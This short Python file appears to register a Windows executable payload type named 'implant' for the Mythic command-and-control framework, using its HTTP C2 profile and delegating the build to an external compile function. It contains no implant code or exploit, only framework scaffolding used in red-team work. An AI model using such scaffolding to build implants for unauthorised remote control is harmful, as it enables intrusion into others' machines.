from mythic_container.PayloadBuilder import *
class implant(PayloadType):
	name =  "implant"
	file_extention = "exe"
	author = "Ctr-alt-f3"
	supported_os = [SupportedOS.Windows]
	wrapper = False
	supported_c2_profiles = ["http"]
	build_parameters = []
	async def build(self) -> BuildResponse:
		from builder import sparsuj_i_skompiluj
		return await sparsuj_i_skompiluj(self)